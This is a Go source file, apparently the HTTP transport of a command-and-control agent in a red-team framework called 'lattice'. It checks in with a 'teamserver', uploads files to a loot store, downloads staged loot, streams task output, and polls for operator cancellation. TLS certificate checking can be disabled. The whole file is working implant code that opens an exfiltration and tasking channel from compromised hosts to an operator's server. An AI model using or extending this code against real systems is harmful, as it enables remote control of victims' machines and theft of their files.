package transport

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"

	"google.golang.org/protobuf/proto"

	agentv1 "github.com/digitizables/lattice/gen/lattice/agent/v1"
)

// HTTP talks to the teamserver HTTP channel.
type HTTP struct {
	baseURL string
	client  *http.Client
	Token   string // shared agent token; set on requests with agent_token fields
}

// Options configures the agent HTTP(S) transport.
type Options struct {
	// InsecureSkipVerify skips TLS certificate verification (lab self-signed certs).
	InsecureSkipVerify bool
	// Token is the shared agent secret (LATTICE_AGENT_TOKEN).
	Token string
}

// NewHTTP builds a transport pointed at baseURL, e.g. https://127.0.0.1:8443.
func NewHTTP(baseURL string, opts Options) *HTTP {
	transport := http.DefaultTransport.(*http.Transport).Clone()
	if opts.InsecureSkipVerify {
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} //nolint:gosec // lab default for self-signed agent certs
	}
	return &HTTP{
		baseURL: baseURL,
		Token:   opts.Token,
		client: &http.Client{
			Timeout:   30 * time.Second,
			Transport: transport,
		},
	}
}

// CheckIn posts an AgentCheckIn and returns the server response.
func (h *HTTP) CheckIn(ctx context.Context, in *agentv1.AgentCheckIn) (*agentv1.AgentCheckInResponse, error) {
	if in != nil && h.Token != "" {
		in.AgentToken = h.Token
	}
	var out agentv1.AgentCheckInResponse
	if err := h.post(ctx, "/v1/checkin", in, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

// PostLootUpload deposits a file into the teamserver loot store (POST /v1/loot/upload).
func (h *HTTP) PostLootUpload(ctx context.Context, in *agentv1.AgentLootUpload) (*agentv1.AgentLootUploadResponse, error) {
	if in != nil && h.Token != "" {
		in.AgentToken = h.Token
	}
	prev := h.client
	h.client = &http.Client{
		Timeout:   5 * time.Minute,
		Transport: prev.Transport,
	}
	defer func() { h.client = prev }()

	var out agentv1.AgentLootUploadResponse
	if err := h.post(ctx, "/v1/loot/upload", in, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

// DownloadLoot fetches staged loot bytes (POST /v1/loot/download).
func (h *HTTP) DownloadLoot(ctx context.Context, agentID, lootID string) (*agentv1.AgentLootDownloadResponse, error) {
	prev := h.client
	h.client = &http.Client{
		Timeout:   5 * time.Minute,
		Transport: prev.Transport,
	}
	defer func() { h.client = prev }()

	var out agentv1.AgentLootDownloadResponse
	err := h.post(ctx, "/v1/loot/download", &agentv1.AgentLootDownload{
		AgentId:    agentID,
		AgentToken: h.Token,
		LootId:     lootID,
	}, &out)
	if err != nil {
		return nil, err
	}
	return &out, nil
}

// PostResult sends a task result.
func (h *HTTP) PostResult(ctx context.Context, in *agentv1.AgentTaskResult) (*agentv1.AgentTaskResultResponse, error) {
	var out agentv1.AgentTaskResultResponse
	if err := h.post(ctx, "/v1/result", in, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

// MarkRunning tells the server execution started; cancelled means abort before start.
func (h *HTTP) MarkRunning(ctx context.Context, agentID, taskID string) (cancelled bool, err error) {
	var out agentv1.AgentTaskRunningResponse
	err = h.post(ctx, "/v1/task_running", &agentv1.AgentTaskRunning{
		AgentId: agentID,
		TaskId:  taskID,
	}, &out)
	return out.GetCancelled(), err
}

// PollCancel returns true when the operator cancelled the task.
func (h *HTTP) PollCancel(ctx context.Context, agentID, taskID string) (bool, error) {
	var out agentv1.AgentTaskCancelPollResponse
	err := h.post(ctx, "/v1/task_cancel_poll", &agentv1.AgentTaskCancelPoll{
		AgentId: agentID,
		TaskId:  taskID,
	}, &out)
	return out.GetCancelled(), err
}

// PostOutput pushes live stdout/stderr for a still-running task.
// cancelled means the operator hit Ctrl+C and the agent should stop.
func (h *HTTP) PostOutput(ctx context.Context, agentID, taskID, stdout, stderr string) (cancelled bool, err error) {
	var out agentv1.AgentTaskOutputResponse
	err = h.post(ctx, "/v1/task_output", &agentv1.AgentTaskOutput{
		AgentId: agentID,
		TaskId:  taskID,
		Stdout:  stdout,
		Stderr:  stderr,
	}, &out)
	return out.GetCancelled(), err
}

func (h *HTTP) post(ctx context.Context, path string, in, out proto.Message) error {
	raw, err := proto.Marshal(in)
	if err != nil {
		return err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, h.baseURL+path, bytes.NewReader(raw))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/protobuf")

	res, err := h.client.Do(req)
	if err != nil {
		return err
	}
	defer res.Body.Close()
	body, err := io.ReadAll(io.LimitReader(res.Body, 64<<20))
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("%s: status %d: %s", path, res.StatusCode, string(body))
	}
	return proto.Unmarshal(body, out)
}
